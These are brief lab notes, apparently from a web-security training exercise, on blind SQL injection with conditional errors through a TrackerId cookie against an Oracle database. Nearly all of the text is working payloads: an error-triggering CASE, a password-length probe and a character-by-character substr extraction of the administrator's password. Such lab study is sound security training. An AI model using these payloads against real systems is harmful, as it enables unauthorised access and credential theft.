1) take a request and change the cookie TrackerId to 
...' || (SELECT '' FROM dual) --

we can see here that it works

...' || (SELECT '' FROM fake_table) --
this triggers an error and the server responds with an internal server error



2) we try to see if we are able to raise an exception when our select is ok
' || (SELECT CASE WHEN ('1'='1') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
in this case the server responds with an internal error server because '1'='1' and the query triggers TO_CHAR(1/0) that generates an error

' || (SELECT CASE WHEN ('1'='0') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
it is ok because we don't have errors in fact '1' != '0'

2)

LENGTH of password:
' || (SELECT CASE WHEN length(password)=2 THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')--

        NOTE: "administrator doesn't work


then we fuzz the 1 from 1 to 25 and we get that the password has length 20 because we obtain INTERNAL SERVER ERROR


3) now  we can use substring to retrieve the password

' || (SELECT CASE WHEN (substr(password, 1, 1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')--

and we fuzz the first 1 from 1 to 20 and the char 'a' from a-z and 0-9
